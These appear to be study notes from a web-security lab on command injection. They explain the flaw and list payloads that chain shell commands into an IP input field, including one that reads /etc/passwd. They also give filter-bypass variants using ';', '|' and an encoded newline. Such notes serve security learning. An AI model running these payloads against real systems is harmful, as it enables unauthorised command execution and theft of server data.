## Command Injection

### What is it?
User input passed directly to OS command.
Attacker runs system commands on the server.

### How to identify
Look for features that ping IPs or process 
system-level input. Test with:
```bash
; whoami
| id
&& ls
```

### Low Security
```bash
127.0.0.1; whoami
127.0.0.1 && cat /etc/passwd
127.0.0.1 | ls -la
```

### Medium Security Bypass
Medium blocks && operator. Use alternatives:
```bash
127.0.0.1; whoami
127.0.0.1 | whoami
127.0.0.1 %0a whoami
```

### Key Lesson
When one operator is filtered:
- `&&` blocked → try `;` or `|`
- Always try URL encoded newline `%0a`
- Filters are rarely complete

### Impact
Read sensitive files

Create reverse shell

Access internal network

Full server compromise
